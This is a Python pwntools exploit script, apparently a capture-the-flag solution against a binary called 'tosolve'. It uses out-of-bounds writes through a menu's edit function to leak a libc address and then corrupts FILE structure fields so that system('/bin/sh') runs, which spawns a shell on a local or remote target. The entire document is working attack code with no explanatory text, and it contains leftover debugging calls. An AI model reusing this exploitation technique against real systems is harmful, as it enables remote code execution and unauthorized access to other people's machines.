#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
code = ELF('tosolve', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))

def edit(idx, offset, data):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(offset))
    r.sendafter(': ', data)

def exploit(r):
    raw_input('#')
    edit(-6, 3205, '\xff')
    r.interactive()
    tmp = r.recvuntil('1. ')
    libc.address = u64(tmp[5:5+8]) - 0x21ba70
    info('%#x libc.address', libc.address)

    #edit(-8, -3427+0x30, p64(0))
    #edit(-8, -3427+0x18, p64(1))
    edit(-8, -3427+0x20, p64(0))
    #edit(-8, -3427+0x28, p64(1))
    edit(-8, -3427+0xd8, p64(libc.address + 0x2163c0+0x20))
    edit(-8, -3427+0x38, p64(libc.sym['system']))
    edit(-8, -3427+0x48, p64(binsh()))
    edit(-8, -3427+0xe0, p64(libc.sym['_IO_2_1_stdin_']))
    edit(-8, -3427+0x50, p64(1))

    r.sendlineafter(': ', '5')
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = code.process()
    libc = ELF('./libc.so.6', checksec=False)
    exploit(r)
